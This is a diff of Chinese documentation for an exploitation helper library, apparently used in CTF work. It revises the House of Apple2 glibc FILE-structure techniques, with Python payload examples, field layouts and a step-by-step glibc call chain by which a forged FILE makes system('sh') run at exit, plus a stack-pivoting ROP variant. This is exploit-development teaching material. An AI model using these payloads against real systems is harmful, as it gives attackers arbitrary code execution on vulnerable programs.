@@ -195,13 +195,15 @@ House of Apple2 技术，通过伪造 `_wide_data` 和 vtable 指向 `_IO_wfile_
 
 **适用版本**：libc 2.35+（Ubuntu 22.04+，仅 amd64）
 
-**前提**：`standard_FILE_addr` 应为 `_IO_2_1_stdin_`/`_IO_2_1_stdout_`/`_IO_2_1_stderr_` 之一的地址。如果不是，则 `standard_FILE_addr - 0x30` 和 `standard_FILE_addr - 0x18` 处的内容必须为 0。
+**核心约束**：`fake_file_addr` 必须是这个假 FILE 结构体在内存中的实际落地地址（如堆上某个 chunk 的起始），**不是**某个标准流（`_IO_2_1_stdout_` 等）的地址。该结构体内部使用自引用指针（`_codecvt` 指向自身、`_wide_data` 指向自身 - 0x48），只有当参数与真实地址一致时链条才能闭合。如果假 FILE 恰好原地覆盖了某个标准流，那么标准流地址和落地地址碰巧相等，此时传标准流地址也可行——但这只是巧合，不是一般情况。
+
+此外 `*(fake_file_addr - 0x30)` 和 `*(fake_file_addr - 0x18)` 必须为 0（glibc 的 `_IO_wdoallocbuf` 会检查这两处）。
 
 **参数**：
 
 | 参数 | 类型 | 说明 |
 |------|------|------|
-| `standard_FILE_addr` | int | 标准 IO 文件结构体地址 |
+| `fake_file_addr` | int | 假 FILE 结构体在内存中的实际地址 |
 | `_IO_wfile_jumps_addr` | int | `_IO_wfile_jumps` 地址 |
 | `system_addr` | int | `system` 函数地址 |
 | `cmd` | str | 要执行的命令，长度必须小于 7，默认为 `"sh"` |
@@ -210,30 +212,41 @@ House of Apple2 技术，通过伪造 `_wide_data` 和 vtable 指向 `_IO_wfile_
 
 ```python
 context.arch = "amd64"
-libc_base = 0x7f0000000000
-stdout_addr = libc_base + libc.sym['_IO_2_1_stdout_']
 
+# 假 FILE 写到堆上某个 chunk：fake_file_addr 是该 chunk 的地址
+# 确保 *(fake_file_addr - 0x30) == 0 且 *(fake_file_addr - 0x18) == 0
 fake_io = IO_FILE_plus_struct()
 payload = fake_io.house_of_apple2_execmd_when_exit(
-    standard_FILE_addr  = stdout_addr,
-    _IO_wfile_jumps_addr= libc_base + libc.sym['_IO_wfile_jumps'],
-    system_addr         = libc_base + libc.sym['system'],
+    fake_file_addr      = heap_addr,      # 假 FILE 的实际落地地址
+    _IO_wfile_jumps_addr= libc.sym['_IO_wfile_jumps'],
+    system_addr         = libc.sym['system'],
     cmd                 = "sh"
 )
-# 将 payload 写入伪造的 IO_FILE 位置
+# 将 payload 写入 fake_file_addr 指向的位置，再让 _IO_list_all 指向它
 ```
 
 **别名**：`house_of_apple2_execmd_when_do_IO_operation` 与该方法等价，适用于任意 IO 操作触发的场景。
 
-**关键字段设置**：
+**关键字段设置与自引用原理**：
 
 ```
 flags      = "  sh\x00\x00\x00"  (命令嵌入 flags)
-chain      = system_addr         (函数指针)
-_wide_data = standard_FILE_addr - 0x48
-_codecvt   = standard_FILE_addr
+chain      = system_addr         (offset 0x68，最终被当作函数指针调用)
+_wide_data = fake_file_addr - 0x48
+_codecvt   = fake_file_addr
 vtable     = _IO_wfile_jumps
-_lock      = standard_FILE_addr - 0x10
+_lock      = fake_file_addr - 0x10
+
+glibc 调用链：
+  _IO_wfile_overflow -> _IO_wdoallocbuf -> _IO_WDOALLOCATE(fp)
+    wide_vtable = *(_wide_data + 0xe0)
+                = *(fake_file_addr - 0x48 + 0xe0)
+                = *(fake_file_addr + 0x98)          <- 正好是 _codecvt 字段
+                = fake_file_addr                    <- 指回自身
+    call *(wide_vtable + 0x68)
+       = *(fake_file_addr + 0x68)                   <- 正好是 chain 字段
+       = system_addr
+    -> system(fp)，fp 的首 8 字节是 flags = "  sh"，于是执行 sh
 ```
 
 ***
@@ -244,13 +257,13 @@ House of Apple2 的栈迁移变体。通过 `leave; ret` gadget 将栈迁移到�
 
 **适用版本**：libc 2.35+（Ubuntu 22.04+，仅 amd64）
 
-**前提**：同 2.4。
+**核心约束**：同 2.4——`fake_file_addr` 必须是假 FILE 的实际落地地址,`*(fake_file_addr - 0x30)` 和 `*(fake_file_addr - 0x18)` 必须为 0。
 
 **参数**：
 
 | 参数 | 类型 | 说明 |
 |------|------|------|
-| `standard_FILE_addr` | int | 标准 IO 文件结构体地址 |
+| `fake_file_addr` | int | 假 FILE 结构体在内存中的实际地址 |
 | `_IO_wfile_jumps_addr` | int | `_IO_wfile_jumps` 地址 |
 | `leave_ret_addr` | int | `leave; ret` gadget 地址 |
 | `pop_rbp_addr` | int | `pop rbp; ret` gadget 地址 |
@@ -260,13 +273,11 @@ House of Apple2 的栈迁移变体。通过 `leave; ret` gadget 将栈迁移到�
 
 ```python
 context.arch = "amd64"
-libc_base = 0x7f0000000000
-stdout_addr = libc_base + libc.sym['_IO_2_1_stdout_']
 
 fake_io = IO_FILE_plus_struct()
 payload = fake_io.house_of_apple2_stack_pivoting_when_exit(
-    standard_FILE_addr  = stdout_addr,
-    _IO_wfile_jumps_addr= libc_base + libc.sym['_IO_wfile_jumps'],
+    fake_file_addr      = heap_addr,      # 假 FILE 的实际落地地址
+    _IO_wfile_jumps_addr= libc.sym['_IO_wfile_jumps'],
     leave_ret_addr      = libc_base + leave_ret_offset,
     pop_rbp_addr        = libc_base + pop_rbp_offset,
     fake_rbp_addr       = rop_chain_addr - 8
